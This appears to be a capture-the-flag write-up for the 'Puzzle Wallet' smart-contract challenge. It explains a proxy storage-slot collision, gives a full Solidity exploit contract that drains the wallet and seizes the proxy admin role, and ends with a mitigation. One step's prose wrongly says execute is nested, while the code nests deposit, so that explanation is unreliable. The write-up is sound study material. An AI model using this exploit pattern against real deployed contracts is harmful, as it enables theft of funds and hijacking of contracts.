## Objectives

- Become `admin` of the proxy.

## Vulnerabilities

### Different storage variables between proxy and logic contracts

The `PuzzleProxy` and `PuzzleWallet` contracts don't have the same storage variables. This is dangerous since
a proxy uses `delegatecall` which can cause the proxy's storage slots to be **overwritten** using the `PuzzleWallet`'s logic.

## Exploit

1. Write and deploy the following `PuzzleWalletHack` contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

interface IWallet {
    function admin() external view returns (address);
    function whitelisted(address addr) external view returns (bool);
    function balances(address addr) external view returns (uint256);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletHack {
    IWallet target;

    constructor(address _targetAddress) {
        target = IWallet(_targetAddress);
    }

    function getWhiteListed() external {
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
        require(target.whitelisted(address(this)), "Get WhiteListed failed!");
    }

    function emptyTargetBalance() external payable {
        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(target.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(target.multicall.selector, deposit_data);

        target.multicall{value: 0.001 ether}(data);

        target.execute(msg.sender, 0.002 ether, "");
        require(target.balances(address(this)) == 0, "Empty balance failed!");
    }

    function becomeAdmin() external {
        target.setMaxBalance(uint256(uint160(msg.sender)));
        require(target.admin() == msg.sender, "Overwrite admin failed!");
        selfdestruct(payable(msg.sender));
    }
}
```

The hack logic was split in three different functions but could have all been included inside the constructor.

2. Call `getWhiteListed`. This function does two things:

First it calls `proposeNewAdmin(address(this))` from the _proxy contract_. This sets the _hack contract_'s address as `pendingAdmin`. This
values is stored in **slot 0**. This slot **collides** with the `owner` varaible of the _logic contract_. We have therefore
changed that value also making our hack contract **the new owner**!

Second, it calls `addToWhitelist(address(this))` from the _logic contract_. This function has the `onlyOwner` modifer as its
only _access control_. Since the _hack contract_'s address is now the owner, it sets the _contract address_ as `whitelisted`.

3. Call `emptyTargetBalance` with a value of at least 0.002 Eth. The goal here is to empty the balance of _PuzzleWallet_. The expoit we use is making one transaction
   with `value` and withdrawing the amount twice using `multicall`.

   `execute` is the function used to witdraw Eth from the _logic contract_.

   `multicall` is a function that enables us to make multiple function calls at once on the _logic contract_ with a single
   `msg.amount`. A `require` function verifies that `execute` is not called twice. The exploit relies in calling `multicall`
   with `execute` followed by `multicall` with `execute` as it's parameter. Nested `delegatecall`s share the same `msg.value`
   but can execute logic in different places.

   If the transaction is successful, the balance of the _logic contract_ is now 0.

4. Call `becomeAdmin`. This function calls `setMaxBalance(uint256(uint160(msg.sender)))` which changes `maxBalance` to a uint256
   with the 20bytes of the _hack contract_ address as it's rightmost bytes. This variable is in slot 1 which overrites `admin` of
   the _proxy contract_. This statisfies the goal of this challenge!

## Suggested mitigation

1. Start `PuzzleWallet` with the storage variable of `PuzzleProxy` and only then, add it's own valriables.

```solidity
contract PuzzleWallet {
    address public pendingAdmin;
    address public admin;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    // Rest of the contract code...
}
```
